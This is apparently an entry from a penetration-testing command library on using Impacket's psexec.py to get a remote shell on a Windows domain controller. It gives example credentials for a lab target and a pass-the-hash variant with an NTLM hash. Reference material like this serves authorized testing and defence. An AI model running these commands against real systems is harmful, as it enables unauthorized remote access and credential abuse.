---
id: 6dde797f-9ebc-49cb-954f-d3f24305925c
name: impacket-psexec-remote-execution
type: command
executor: bash
data: 'psexec.py ''$_DOMAIN/$_ESCALATED_USER:$_PASSWORD@$_TARGET_DC_IP'''
output: null
created_at: '2023-04-06T03:56:05.609356+00:00'
updated_at: '2023-04-10T20:26:29.616322+00:00'
platforms:
  - Linux
tags:
  - remote
  - execution
  - shell
verified: true
validated: true
---

# impacket-psexec-remote-execution

## Command

```bash
psexec.py '$_DOMAIN/$_ESCALATED_USER:$_PASSWORD@$_TARGET_DC_IP'
```

## Description

Uses Impacket's psexec.py to execute a remote command shell on a Windows target using provided credentials, typically after privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Domain name (e.g., LAB) | Yes |
| $_ESCALATED_USER | Username with escalated privileges (e.g., winrm_user_1) | Yes |
| $_PASSWORD | Password for the user | Yes |
| $_TARGET_DC_IP | Target IP (e.g., 192.168.83.135) | Yes |

## Examples

### Basic Usage

```bash
psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
```

### Advanced Usage

With hash instead of password:
```bash
psexec.py -hashes :$_NTLM_HASH '$_DOMAIN/$_USER@$_IP'
```

## Expected Output

"Impacket v0.x.x - Copyright..." followed by remote shell: "C:\Windows\system32> whoami". Errors if auth fails or service unavailable.

## Related

- [[commands/ntlmrelayx-ldap-escalate-user]]
- [[procedures/DCOM-DCE-RPC-Relay-using-RemotePotato0]]
